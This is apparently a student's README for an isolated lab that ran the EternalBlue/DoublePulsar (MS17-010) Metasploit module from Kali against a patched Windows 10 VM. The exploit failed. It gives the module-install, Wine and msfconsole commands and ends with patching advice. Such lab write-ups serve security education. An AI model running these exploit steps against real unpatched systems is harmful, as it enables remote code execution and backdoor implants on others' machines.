# EternalBlue-DoublePulsar-Penetration-Testing-Lab
**Educational purposes only** -  This project was conducted in a fully isolated virtual machine environment. Do not attempt to use these techniques on any system you do not own or have explicit written permission to test.

## Overview

This project demonstrates a controlled penetration testing lab environment built using Oracle VM VirtualBox, Kali Linux, and a Windows 10 target machine. The lab explores the EternalBlue (MS17-010) SMB vulnerability and the DoublePulsar backdoor implant using the Metasploit Framework, providing hands-on experience in exploit development, network segmentation, and post-execution analysis.

The exploit ultimately did not succeed — intentionally — because the target was running a patched version of Windows 10, which is not susceptible to this vulnerability. The value of the project lies in the process: environment setup, tool configuration, dependency management, and troubleshooting.

---

## What is EternalBlue?

EternalBlue (CVE-2017-0144) is a critical vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol, specifically SMBv1. It allows a remote attacker to send specially crafted packets to a vulnerable Windows machine and execute arbitrary code without authentication. Originally developed by the NSA, it was leaked by the Shadow Brokers in 2017 and subsequently used in major attacks including WannaCry and NotPetya.

DoublePulsar is a kernel-level backdoor implant that is typically deployed alongside EternalBlue to establish a persistent foothold on a compromised system.

---

## Lab Environment

| Component | Details |
|---|---|
| Hypervisor | Oracle VM VirtualBox |
| Attacker Machine | Kali Linux |
| Target Machine | Windows 10 (fully patched) |
| Network Adapter 1 | NAT (internet access) |
| Network Adapter 2 | Host-Only Adapter (VM-to-VM communication) |
| Kali IP Address | We will call it "X" |
| Windows IP Address |We will call this as "Y" |

---

## Prerequisites

- Oracle VM VirtualBox installed on host machine
- Kali Linux ISO
- Windows 10 ISO
- Internet access on Kali for package installation
- Git installed on Kali Linux

---

## Setup and Configuration

### Step 1 — Network Configuration

Both virtual machines were configured with two network adapters:

- **Adapter 1:** NAT — provides internet access to both VMs
- **Adapter 2:** Host-Only Adapter — enables direct communication between Kali and Windows without going through the host network

Verify connectivity after setup:

```bash
# On Kali Linux
ip addr

# On Windows
ipconfig

# Ping test from Kali to Windows
ping Y - windows IP

# Ping test from Windows to Kali
ping X - Kali IP
```

---

### Step 2 — Clone the EternalBlue-DoublePulsar Module

```bash
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
```

Copy the custom Metasploit module into the correct directory:

```bash
cp Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb \
  /home/kali/.msf4/modules/exploits/windows/smb/
```

Copy the full project folder to root:

```bash
cp -r Eternalblue-Doublepulsar-Metasploit/ /root/Eternalblue-Doublepulsar-Metasploit/
```

---

### Step 3 — Install Wine (Required Dependency)

The EternalBlue-DoublePulsar module relies on Windows binaries executed through Wine:

```bash
dpkg --add-architecture i386
apt update
apt install -y wine32:i386
wineboot
```

Verify the Wine directory was created:

```bash
ls /root/.wine
```

---

### Step 4 — Load the Custom Module in Metasploit

Launch Metasploit as root:

```bash
sudo msfconsole
```

Inside Metasploit, load and refresh the custom module path:

```
loadpath /home/kali/.msf4/modules
reload_all
```

---

## Exploitation Walkthrough

### Step 5 — Vulnerability Scanning

Before attempting exploitation, scan the target to check for MS17-010 vulnerability:

```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS "Y" - windows IP 
run
```

> **Result:** The scanner returned an SMB login error when connecting to the IPC$ share, indicating the target was reachable over SMB but the vulnerability could not be confirmed.

---

### Step 6 — Configure and Run the Exploit

```
use exploit/windows/smb/eternalblue_doublepulsar
set RHOST "Y" - Windows IP
set LHOST "X" - Kali IP
set PROCESSINJECT explorer.exe
run
```

> **Result:** The exploit successfully generated XML configuration files and the payload DLL using Wine. However, no Meterpreter session was established.

---

## Results and Analysis

| Stage | Outcome |
|---|---|
| VM network setup | ✅ Successful |
| Ping connectivity between VMs | ✅ Successful |
| Custom Metasploit module loaded | ✅ Successful |
| Wine installation and initialisation | ✅ Successful |
| SMB vulnerability scan | ⚠️ Inconclusive (SMB reachable, vulnerability not confirmed) |
| EternalBlue exploit execution | ✅ Launched successfully |
| DoublePulsar payload delivery | ❌ No Meterpreter session established |

**Why the exploit failed (as expected):**

The custom EternalBlue-DoublePulsar module targets Windows 7 and Windows Server 2008 R2, which were vulnerable before Microsoft released patch MS17-010 in March 2017. The target machine was running Windows 10 with up-to-date patches applied, making it not susceptible to this vulnerability. This outcome was the expected and intended result of the lab.

---

## Key Concepts Demonstrated

- Virtual lab setup and network segmentation using Host-Only adapters
- Custom Metasploit module installation and loading
- Wine dependency management for Windows binary execution
- SMB vulnerability scanning with Metasploit auxiliary modules
- Exploit configuration and execution workflow
- Post-execution troubleshooting and root cause analysis
- Importance of patch management as a security control

---

## Defensive Takeaways

- **Disable SMBv1** on all Windows systems — it is legacy and insecure
- **Apply MS17-010 patch** immediately on any unpatched Windows 7 / Server 2008 R2 systems
- **Network segmentation** limits the blast radius of SMB-based lateral movement
- **Keep systems patched** — this lab demonstrates that patching alone prevented a well-known, weaponised exploit

---

## Disclaimer

This project was conducted entirely within an isolated virtual machine environment for educational purposes as part of a cybersecurity lab. No real systems were targeted. These techniques should only ever be used in environments you own or have explicit written authorisation to test. Unauthorised use of these tools is illegal.

---

## References

- [CVE-2017-0144 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [Microsoft MS17-010 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [ElevenPaths EternalBlue-DoublePulsar Metasploit Module](https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit)
- [Metasploit Framework Documentation](https://docs.metasploit.com/)
